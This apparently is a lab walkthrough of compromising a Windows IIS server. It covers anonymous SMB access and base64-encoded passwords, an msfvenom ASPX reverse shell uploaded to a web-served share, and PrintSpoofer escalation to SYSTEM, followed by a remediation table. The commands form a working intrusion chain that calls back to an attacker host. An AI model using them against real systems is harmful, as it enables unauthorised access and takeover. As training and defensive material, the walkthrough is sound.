2. Phase 1: Reconnaissance & Enumeration

2.1 Full Port Scanning (Nmap)

We run a full TCP port scan against target 10.49.165.122:

nmap -sV -sC -p- 10.49.165.122 -Pn

Identified Ports:
- Port 80/tcp: Microsoft IIS httpd 10.0
- Port 135/tcp: Microsoft Windows RPC
- Port 139/tcp / 445/tcp: Microsoft Windows SMB
- Port 3389/tcp: Microsoft Terminal Services (RDP)
- Port 49663/tcp: Microsoft IIS httpd 10.0
- Port 49666/tcp / 49667/tcp: Microsoft Windows RPC

2.2 SMB Enumeration & passwords.txt

We check available SMB shares using a null session:

smbclient -L //10.49.165.122/ -N

We connect to the readable/writable share nt4wrksv and list its contents:

smbclient //10.49.165.122/nt4wrksv -N
smb: \> ls
smb: \> get passwords.txt
smb: \> exit

We inspect passwords.txt with nano:

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

2.3 Decoding Base64 Credentials

We decode both base64 strings into separate files:

echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d > pass1.txt
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d > pass2.txt
cat pass1.txt
cat pass2.txt

3. Phase 2: Web Enumeration & Initial Access

3.1 Web Directory Busting on Port 49663 (Gobuster)

Since port 80 did not expose the SMB share, we perform directory brute-forcing against the high IIS port 49663:

gobuster dir -u http://10.49.165.122:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15

Result:

nt4wrksv (Status: 301) [Size: 159] [--> http://10.49.165.122:49663/nt4wrksv/]

3.2 Confirming SMB-to-Web Directory Mapping

We browse to http://10.49.165.122:49663/nt4wrksv/:

We then verify that the passwords.txt file located in the SMB share is directly served via HTTP at http://10.49.165.122:49663/nt4wrksv/passwords.txt:

This confirms that any file uploaded to the nt4wrksv SMB share can be executed via the IIS web server on port 49663.

3.3 Generating & Uploading ASPX Reverse Shell

We generate a 64-bit Windows ASPX reverse shell using msfvenom targeting our VPN IP (tun1):

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun1 LPORT=4444 -f aspx -o shell.aspx

We upload shell.aspx into the nt4wrksv SMB share:

smbclient //10.49.165.122/nt4wrksv -N
smb: \> put shell.aspx

3.4 Catching Reverse Shell

We prepare our listener with Penelope:

penelope nc -p 4444

We trigger the payload by requesting http://10.49.165.122:49663/nt4wrksv/shell.aspx in the browser:

Penelope catches the reverse shell:

c:\windows\system32\inetsrv>whoami

The presence of SeImpersonatePrivilege: Enabled on Windows Server 2016 allows local privilege escalation via named pipe impersonation using PrintSpoofer.

4.2 Hosting PrintSpoofer Binary

On the attacker machine inside the privesc directory containing PrintSpoofer64.exe, we start a Python HTTP server:

python3 -m http.server 8000

4.3 Executing PrintSpoofer64 to SYSTEM

From PowerShell on the target machine, we download PrintSpoofer64.exe to C:\Windows\Temp and execute it to spawn an elevated cmd.exe:

5. Security Mitigations & Remediation

Vulnerability / Misconfiguration Impact Recommended Remediation
Anonymous Writable SMB Share directly served as Web Root Unauthenticated remote arbitrary file upload and RCE. 1. Disable anonymous/guest SMB access.
2. Strictly separate file shares from web server document roots.
3. Remove execute permissions for application pools on upload folders.
Cleartext / Base64 Encoded Passwords in Public Share Credential leakage (Bob & Bill). Never store passwords in unauthenticated network shares; implement centralized identity management and password vaults.
Token Impersonation Abuse (SeImpersonatePrivilege) Service account escalation to full NT AUTHORITY\SYSTEM. Follow the principle of least privilege: configure IIS application pools to run under accounts without SeImpersonatePrivilege, or upgrade to Windows builds resistant to pipe potato attacks.
